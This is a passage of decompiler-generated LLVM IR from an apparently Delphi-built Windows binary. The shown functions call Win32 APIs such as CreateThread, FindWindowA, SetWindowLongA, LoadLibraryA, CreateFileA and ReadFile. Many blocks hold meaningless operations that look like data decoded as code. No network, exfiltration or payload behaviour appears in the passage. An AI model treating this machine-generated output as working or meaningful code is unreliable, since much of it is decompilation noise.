  %21 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1475
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1475
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !1475
  br label %dec_label_pc_40667d, !insn.addr !1475

dec_label_pc_40667d:                              ; preds = %dec_label_pc_406678, %dec_label_pc_406619
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %22 = add i32 %0, 20, !insn.addr !1476
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1476
  %24 = load i32, i32* %23, align 4, !insn.addr !1476
  %25 = add i32 %esp.1.reload, -4, !insn.addr !1477
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1477
  store i32 %24, i32* %26, align 4, !insn.addr !1477
  %27 = add i32 %0, 16, !insn.addr !1478
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1478
  %29 = load i32, i32* %28, align 4, !insn.addr !1478
  %30 = add i32 %esp.1.reload, -8, !insn.addr !1479
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1479
  store i32 %29, i32* %31, align 4, !insn.addr !1479
  %32 = add i32 %esp.1.reload, -12, !insn.addr !1480
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1480
  store i32 %ebx.1.reload, i32* %33, align 4, !insn.addr !1480
  %34 = add i32 %0, 8, !insn.addr !1481
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1481
  %36 = load i32, i32* %35, align 4, !insn.addr !1481
  %37 = add i32 %esp.1.reload, -16, !insn.addr !1482
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1482
  store i32 %36, i32* %38, align 4, !insn.addr !1482
  ret x86_fp80 %2, !insn.addr !1482

dec_label_pc_40668c:                              ; preds = %dec_label_pc_406617
  %39 = fdiv x86_fp80 %2, %2, !insn.addr !1483
  ret x86_fp80 %39, !insn.addr !1484
}

define i32 @function_406698() local_unnamed_addr {
dec_label_pc_406698:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1485
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1485
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220444 to i32*), i32 -4, i32 %3), !insn.addr !1486
  ret i32 %4, !insn.addr !1487
}

define i32 @function_4066cd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4066cd:
  %merge7.reg2mem = alloca i32, !insn.addr !1488
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1488
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1488
  store i8 %3, i8* %4, align 1, !insn.addr !1488
  %5 = add i32 %1, 114, !insn.addr !1489
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1489
  %7 = load i8, i8* %6, align 1, !insn.addr !1489
  %8 = udiv i32 %0, 256, !insn.addr !1489
  %9 = trunc i32 %8 to i8, !insn.addr !1489
  %10 = add i8 %7, %9, !insn.addr !1489
  store i8 %10, i8* %6, align 1, !insn.addr !1489
  %11 = add i8 %2, -32, !insn.addr !1490
  %12 = icmp ult i8 %2, 32, !insn.addr !1490
  %13 = icmp eq i8 %11, 0, !insn.addr !1490
  %14 = zext i8 %11 to i32, !insn.addr !1490
  %15 = and i32 %1, -256, !insn.addr !1490
  %16 = or i32 %15, %14, !insn.addr !1490
  %17 = or i1 %12, %13, !insn.addr !1491
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1491
  br i1 %17, label %dec_label_pc_4066d6, label %dec_label_pc_406727, !insn.addr !1491

dec_label_pc_4066d6:                              ; preds = %dec_label_pc_4066cd
  %18 = add i32 %16, 105, !insn.addr !1492
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1492
  %20 = load i8, i8* %19, align 1, !insn.addr !1492
  %21 = and i8 %20, %9, !insn.addr !1492
  store i8 %21, i8* %19, align 1, !insn.addr !1492
  %22 = trunc i32 %arg3 to i16, !insn.addr !1493
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1493
  %24 = load i8, i8* %23, align 1, !insn.addr !1493
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1493
  %25 = add i32 %arg5, 105, !insn.addr !1494
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1494
  %28 = load i8, i8* %27, align 1, !insn.addr !1494
  %29 = udiv i32 %arg2, 256, !insn.addr !1494
  %30 = trunc i32 %29 to i8, !insn.addr !1494
  %31 = and i8 %28, %30, !insn.addr !1494
  store i8 %31, i8* %27, align 1, !insn.addr !1494
  %32 = mul i32 %arg5, 2, !insn.addr !1495
  %33 = add i32 %arg2, 115, !insn.addr !1495
  %34 = add i32 %33, %32, !insn.addr !1495
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1495
  %36 = load i8, i8* %35, align 1, !insn.addr !1495
  %37 = trunc i32 %arg2 to i8, !insn.addr !1495
  %38 = add i8 %36, %37, !insn.addr !1495
  %39 = icmp eq i8 %38, 0, !insn.addr !1495
  store i8 %38, i8* %35, align 1, !insn.addr !1495
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1496
  br i1 %39, label %dec_label_pc_406727, label %dec_label_pc_4066e5, !insn.addr !1496

dec_label_pc_4066e5:                              ; preds = %dec_label_pc_4066d6
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1497
  %41 = load i32, i32* %40, align 4, !insn.addr !1497
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1497
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1498
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1498
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1498
  %45 = icmp eq i32* %43, null, !insn.addr !1499
  %46 = icmp eq i1 %45, false, !insn.addr !1500
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1500
  br i1 %46, label %dec_label_pc_406727, label %dec_label_pc_406709, !insn.addr !1500

dec_label_pc_406709:                              ; preds = %dec_label_pc_4066e5
  %47 = call i32 @function_406698(), !insn.addr !1501
  %48 = call i32 @function_4036c8(), !insn.addr !1502
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1503
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1504
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1504
  ret i32 %51, !insn.addr !1505

dec_label_pc_406727:                              ; preds = %dec_label_pc_4066cd, %dec_label_pc_4066e5, %dec_label_pc_4066d6
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1506
}

define i32 @function_4067ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4067ed:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1507
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1507
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1507
  %9 = add i8 %6, %8, !insn.addr !1507
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1507
  store i8 %9, i8* %10, align 1, !insn.addr !1507
  %11 = load i32, i32* %eax, align 4, !insn.addr !1508
  %12 = add i32 %11, 114, !insn.addr !1508
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1508
  %14 = load i8, i8* %13, align 1, !insn.addr !1508
  %15 = udiv i32 %2, 256, !insn.addr !1508
  %16 = trunc i32 %15 to i8, !insn.addr !1508
  %17 = add i8 %14, %16, !insn.addr !1508
  store i8 %17, i8* %13, align 1, !insn.addr !1508
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1509
  %20 = add i8 %19, -32, !insn.addr !1509
  %21 = icmp ult i8 %19, 32, !insn.addr !1509
  %22 = icmp eq i8 %20, 0, !insn.addr !1509
  %23 = zext i8 %20 to i32, !insn.addr !1509
  %24 = and i32 %18, -256, !insn.addr !1509
  %25 = or i32 %24, %23, !insn.addr !1509
  store i32 %25, i32* %eax, align 4, !insn.addr !1509
  %26 = or i1 %21, %22, !insn.addr !1510
  br i1 %26, label %dec_label_pc_4067f6, label %dec_label_pc_406865, !insn.addr !1510

dec_label_pc_4067f6:                              ; preds = %dec_label_pc_4067ed
  %27 = add i32 %25, 105, !insn.addr !1511
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1511
  %29 = load i8, i8* %28, align 1, !insn.addr !1511
  %30 = and i8 %29, %16, !insn.addr !1511
  store i8 %30, i8* %28, align 1, !insn.addr !1511
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1512
  store i32 %31, i32* %eax, align 4, !insn.addr !1512
  %32 = trunc i32 %arg3 to i16, !insn.addr !1513
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1513
  %34 = load i8, i8* %33, align 1, !insn.addr !1513
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1513
  %35 = add i32 %arg5, 105, !insn.addr !1514
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1514
  %38 = load i8, i8* %37, align 1, !insn.addr !1514
  %39 = udiv i32 %arg2, 256, !insn.addr !1514
  %40 = trunc i32 %39 to i8, !insn.addr !1514
  %41 = and i8 %38, %40, !insn.addr !1514
  store i8 %41, i8* %37, align 1, !insn.addr !1514
  %42 = mul i32 %arg5, 2, !insn.addr !1515
  %43 = add i32 %arg2, 115, !insn.addr !1515
  %44 = add i32 %43, %42, !insn.addr !1515
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1515
  %46 = load i8, i8* %45, align 1, !insn.addr !1515
  %47 = trunc i32 %arg2 to i8, !insn.addr !1515
  %48 = add i8 %46, %47, !insn.addr !1515
  %49 = icmp eq i8 %48, 0, !insn.addr !1515
  store i8 %48, i8* %45, align 1, !insn.addr !1515
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1516
  br i1 %49, label %dec_label_pc_406847, label %dec_label_pc_406805, !insn.addr !1516

dec_label_pc_406805:                              ; preds = %dec_label_pc_4067f6
  %50 = icmp slt i8 %48, 0, !insn.addr !1515
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1517
  %52 = load i32, i32* %51, align 4, !insn.addr !1517
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1517
  br i1 %50, label %dec_label_pc_40687c, label %dec_label_pc_40680a, !insn.addr !1518

dec_label_pc_40680a:                              ; preds = %dec_label_pc_406805
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1519
  %55 = add i8 %54, -32, !insn.addr !1519
  %56 = icmp ult i8 %54, 32, !insn.addr !1519
  %57 = icmp eq i8 %55, 0, !insn.addr !1519
  %58 = zext i8 %55 to i32, !insn.addr !1519
  %59 = and i32 %53, -256, !insn.addr !1519
  %60 = or i32 %59, %58, !insn.addr !1519
  store i32 %60, i32* %eax, align 4, !insn.addr !1519
  %61 = or i1 %56, %57, !insn.addr !1520
  br i1 %61, label %dec_label_pc_40680e, label %dec_label_pc_40687d, !insn.addr !1520

dec_label_pc_40680e:                              ; preds = %dec_label_pc_40680a
  %62 = add i32 %arg2, 105, !insn.addr !1521
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1521
  %64 = load i8, i8* %63, align 1, !insn.addr !1521
  %65 = udiv i32 %53, 256, !insn.addr !1521
  %66 = trunc i32 %65 to i8, !insn.addr !1521
  %67 = and i8 %64, %66, !insn.addr !1521
  store i8 %67, i8* %63, align 1, !insn.addr !1521
  %68 = add i32 %arg6, 105, !insn.addr !1522
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1522
  %70 = load i8, i8* %69, align 1, !insn.addr !1522
  %71 = and i8 %70, %40, !insn.addr !1522
  store i8 %71, i8* %69, align 1, !insn.addr !1522
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1523
  %74 = load i8, i8* %73, align 1, !insn.addr !1523
  %75 = trunc i32 %72 to i8, !insn.addr !1523
  %76 = add i8 %74, %75, !insn.addr !1523
  store i8 %76, i8* %73, align 1, !insn.addr !1523
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1524
  %79 = load i8, i8* %78, align 1, !insn.addr !1524
  %80 = trunc i32 %77 to i8, !insn.addr !1524
  %81 = add i8 %79, %80, !insn.addr !1524
  store i8 %81, i8* %78, align 1, !insn.addr !1524
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1525
  %83 = load i32, i32* %82, align 4, !insn.addr !1525
  %84 = add i32 %83, %arg6, !insn.addr !1525
  store i32 %84, i32* %82, align 4, !insn.addr !1525
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1526
  %87 = load i8, i8* %86, align 1, !insn.addr !1526
  %88 = trunc i32 %85 to i8, !insn.addr !1526
  %89 = add i8 %87, %88, !insn.addr !1526
  store i8 %89, i8* %86, align 1, !insn.addr !1526
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1527
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1528
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1528
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1528
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1529
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1530
  %93 = add i32 %92, 1, !insn.addr !1530
  %94 = icmp eq i32 %93, 0, !insn.addr !1530
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1530
  %95 = icmp eq i1 %94, false, !insn.addr !1531
  br i1 %95, label %dec_label_pc_40683f, label %dec_label_pc_406835, !insn.addr !1531

dec_label_pc_406835:                              ; preds = %dec_label_pc_40680e
  %96 = call i32 @"@LStrClr"(), !insn.addr !1532
  br label %dec_label_pc_40683f, !insn.addr !1532

dec_label_pc_40683f:                              ; preds = %dec_label_pc_406835, %dec_label_pc_40680e
  store i32 0, i32* %eax, align 4, !insn.addr !1533
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1534
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1535
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1535
  br label %dec_label_pc_406847, !insn.addr !1535

dec_label_pc_406847:                              ; preds = %dec_label_pc_40683f, %dec_label_pc_4067f6
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1536
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1536
  store i32 4221012, i32* %99, align 4, !insn.addr !1536
  %100 = load i32, i32* %eax, align 4, !insn.addr !1537
  ret i32 %100, !insn.addr !1537

dec_label_pc_406865:                              ; preds = %dec_label_pc_4067ed
  %101 = mul i32 %4, 2, !insn.addr !1538
  %102 = add i32 %1, 105, !insn.addr !1538
  %103 = add i32 %102, %101, !insn.addr !1538
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1538
  %105 = load i32, i32* %104, align 4, !insn.addr !1538
  %106 = or i32 %105, %3, !insn.addr !1538
  store i32 %106, i32* %104, align 4, !insn.addr !1538
  %107 = add i32 %0, -1, !insn.addr !1539
  %108 = trunc i32 %3 to i16, !insn.addr !1540
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1540
  %110 = load i32, i32* %109, align 4, !insn.addr !1540
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1540
  %111 = load i32, i32* %eax, align 4, !insn.addr !1541
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1541
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1541
  %115 = or i8 %112, %114, !insn.addr !1541
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1541
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1542
  %118 = load i8, i8* %117, align 1, !insn.addr !1542
  %119 = trunc i32 %116 to i8, !insn.addr !1542
  %120 = add i8 %118, %119, !insn.addr !1542
  store i8 %120, i8* %117, align 1, !insn.addr !1542
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1543
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1543
  %124 = load i8, i8* %123, align 1, !insn.addr !1543
  %125 = add i8 %124, %122, !insn.addr !1543
  %126 = zext i8 %125 to i32, !insn.addr !1543
  %127 = and i32 %121, -256, !insn.addr !1543
  %128 = or i32 %127, %126, !insn.addr !1543
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1544
  %130 = load i8, i8* %129, align 1, !insn.addr !1544
  %131 = trunc i32 %3 to i8, !insn.addr !1545
  %132 = add i8 %125, %131, !insn.addr !1544
  %133 = add i8 %132, %130, !insn.addr !1545
  store i8 %133, i8* %129, align 1, !insn.addr !1545
  %134 = add i32 %128, 1, !insn.addr !1546
  store i32 %134, i32* %eax, align 4, !insn.addr !1546
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1547
  %136 = load i8, i8* %135, align 1, !insn.addr !1547
  %137 = trunc i32 %134 to i8, !insn.addr !1547
  %138 = add i8 %136, %137, !insn.addr !1547
  store i8 %138, i8* %135, align 1, !insn.addr !1547
  br label %dec_label_pc_40687c, !insn.addr !1547

dec_label_pc_40687c:                              ; preds = %dec_label_pc_406865, %dec_label_pc_406805
  %139 = load i32, i32* %eax, align 4, !insn.addr !1547
  ret i32 %139, !insn.addr !1547

dec_label_pc_40687d:                              ; preds = %dec_label_pc_40680a
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1548
  %141 = load i8, i8* %140, align 1, !insn.addr !1548
  %142 = add i8 %141, %55, !insn.addr !1548
  store i8 %142, i8* %140, align 1, !insn.addr !1548
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1549
  %145 = load i8, i8* %144, align 1, !insn.addr !1549
  %146 = trunc i32 %arg3 to i8, !insn.addr !1549
  %147 = add i8 %145, %146, !insn.addr !1549
  store i8 %147, i8* %144, align 1, !insn.addr !1549
  %148 = load i32, i32* %eax, align 4, !insn.addr !1550
  %149 = add i32 %148, 1, !insn.addr !1550
  %150 = mul i32 %149, 2, !insn.addr !1551
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1551
  %152 = load i8, i8* %151, align 2, !insn.addr !1551
  %153 = trunc i32 %149 to i8, !insn.addr !1551
  %154 = add i8 %152, %153, !insn.addr !1551
  store i8 %154, i8* %151, align 2, !insn.addr !1551
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1552
  %156 = load i8, i8* %155, align 1, !insn.addr !1552
  %157 = add i8 %156, %153, !insn.addr !1552
  store i8 %157, i8* %155, align 1, !insn.addr !1552
  ret i32 %149, !insn.addr !1553
}

define i32 @function_40689b() local_unnamed_addr {
dec_label_pc_40689b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1554
}

define i32 @function_4068a8() local_unnamed_addr {
dec_label_pc_4068a8:
  %esp.1.reg2mem = alloca i32, !insn.addr !1555
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1556
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1556
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1556
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1557
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1558
  %3 = call i32 @function_4036c8(), !insn.addr !1559
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1560
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1560
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1560
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1561
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1562
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1563
  br i1 %7, label %dec_label_pc_406a47, label %dec_label_pc_406912, !insn.addr !1563

dec_label_pc_406912:                              ; preds = %dec_label_pc_4068a8
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1561
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1564
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1564
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1565
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1566
  br i1 %12, label %dec_label_pc_406a47, label %dec_label_pc_40692e, !insn.addr !1566

dec_label_pc_40692e:                              ; preds = %dec_label_pc_406912
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1567
  %14 = call i32 @function_403720(), !insn.addr !1568
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1569
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1569
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1570
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1570
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1571
  %19 = call i32 @function_4046d4(), !insn.addr !1572
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406a47

dec_label_pc_406a47:                              ; preds = %dec_label_pc_40692e, %dec_label_pc_406912, %dec_label_pc_4068a8
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1573
  %21 = load i32, i32* %20, align 4, !insn.addr !1573
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1574
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1575
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1575
  store i32 4221545, i32* %23, align 4, !insn.addr !1575
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1576
  ret i32 %24, !insn.addr !1577
}

define i32 @function_406a62() local_unnamed_addr {
dec_label_pc_406a62:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1578
  ret i32 %0, !insn.addr !1578
}

define i32 @function_406a67() local_unnamed_addr {
dec_label_pc_406a67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1579
}

define i32 @function_406a69(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a69:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1580
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1580
  %3 = load i32, i32* %2, align 4, !insn.addr !1580
  ret i32 %3, !insn.addr !1581
}

define i32 @function_406aa0() local_unnamed_addr {
dec_label_pc_406aa0:
  %esp.2.reg2mem = alloca i32, !insn.addr !1582
  %esp.1.reg2mem = alloca i32, !insn.addr !1582
  %esi.0.reg2mem = alloca i32, !insn.addr !1582
  %esp.0.reg2mem = alloca i32, !insn.addr !1582
  %ebx.0.reg2mem = alloca i32, !insn.addr !1582
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1583
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1584
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1584
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1584
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1585
  %2 = call i32 @function_403c88(), !insn.addr !1586
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1587
  br i1 %3, label %dec_label_pc_406b89, label %dec_label_pc_406ace, !insn.addr !1587

dec_label_pc_406ace:                              ; preds = %dec_label_pc_406aa0
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1588
  %5 = call i32 @function_4036c8(), !insn.addr !1589
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1590
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1590
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1590
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1591
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1592
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1593
  br i1 %9, label %dec_label_pc_406b89, label %dec_label_pc_406b0a, !insn.addr !1593

dec_label_pc_406b0a:                              ; preds = %dec_label_pc_406ace
  %10 = call i32 @"@LStrClr"(), !insn.addr !1594
  %11 = call i32 @function_403c90(), !insn.addr !1595
  %12 = icmp slt i32 %11, 0, !insn.addr !1596
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1597
  br i1 %12, label %dec_label_pc_406b54, label %dec_label_pc_406b22, !insn.addr !1597

dec_label_pc_406b22:                              ; preds = %dec_label_pc_406b0a
  %13 = add i32 %11, 1, !insn.addr !1598
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1599
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1599
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1599
  br label %dec_label_pc_406b25, !insn.addr !1599

dec_label_pc_406b25:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b22
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1600
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1600
  store i32 0, i32* %15, align 4, !insn.addr !1600
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1601
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1602
  %18 = add i32 %16, %17, !insn.addr !1602
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1602
  %20 = load i32, i32* %19, align 4, !insn.addr !1602
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1602
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1602
  store i32 %20, i32* %22, align 4, !insn.addr !1602
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1603
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1603
  store i32 ptrtoint (i32* @global_var_406bd0 to i32), i32* %24, align 4, !insn.addr !1603
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1604
  %26 = or i32 %17, 4, !insn.addr !1605
  %27 = add i32 %25, %26, !insn.addr !1605
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1605
  %29 = load i32, i32* %28, align 4, !insn.addr !1605
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1605
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1605
  store i32 %29, i32* %31, align 4, !insn.addr !1605
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1606
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1606
  store i32 ptrtoint ([3 x i8]* @global_var_406bdc to i32), i32* %33, align 4, !insn.addr !1606
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1607
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1608
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1609
  %37 = icmp eq i32 %36, 0, !insn.addr !1609
  %38 = icmp eq i1 %37, false, !insn.addr !1610
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1610
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1610
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1610
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1610
